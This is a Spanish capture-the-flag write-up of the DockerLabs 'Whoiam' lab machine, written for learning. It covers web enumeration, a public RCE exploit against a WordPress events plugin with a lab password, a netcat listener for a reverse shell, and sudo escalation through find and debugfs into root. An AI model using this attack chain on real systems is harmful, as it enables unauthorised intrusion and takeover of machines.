# Whoiam — DockerLabs.es 🐳
<img width="547" height="297" alt="1" src="https://github.com/user-attachments/assets/c43fe172-0fd7-407e-93e2-5686283d9d65" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Iniciamos con un escaneo en nmap:

```bash
sudo nmap -p- --min-rate 2000 -A -sS -Pn -n 172.18.0.2 -oN escaneo.txt
```

La web no muestra nada interesante, por lo que hacemos fuzzing con gobuster:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,py,php,sh,html
```

Encontramos el directorio `/wp-login.php` — hay un WordPress corriendo.

Seguimos enumerando y hallamos el directorio `/backups` que contiene un archivo con credenciales. Lo descargamos, descomprimimos y leemos: obtenemos usuario y contraseña.

Las probamos en el panel de login de WordPress y obtenemos acceso al panel de administración.

---

## 2. Explotación

Revisamos los plugins instalados y encontramos **Modern Events Calendar**. Lo buscamos en searchsploit:

```bash
searchsploit modern events calendar
```

Encontramos un exploit de RCE (Remote Code Execution). Lo descargamos y ejecutamos:

```bash
searchsploit -m php/webapps/50082.py

python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

El output nos devuelve una URL con una webshell. Nos ponemos en escucha con netcat y enviamos una reverse shell desde la webshell.

```bash
nc -lvnp 443
```

Logramos acceso inicial al sistema.

---

## 3. Escalada de Privilegios

### www-data → rafa

Ejecutamos `sudo -l` y vemos que podemos usar `find` como el usuario **rafa**:

```bash
sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit
```

### rafa → ruben

Volvemos a ejecutar `sudo -l` como rafa y vemos que podemos usar `debugfs` como **ruben**:

```bash
sudo -u ruben /usr/sbin/debugfs
!/bin/bash
```

### ruben → root

En `/opt` encontramos un script que se ejecuta con privilegios. El script compara el input con el número 42, pero podemos inyectar un comando almacenado en una variable de entorno para ejecutarlo como root.

**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Fuzzing web con Gobuster
- Credenciales encontradas en directorio `/backups`
- Explotación de plugin WordPress vulnerable (Modern Events Calendar - RCE)
- Escalada de privilegios con `find` (GTFObins)
- Escalada de privilegios con `debugfs` (GTFObins)
- Inyección de comandos en script
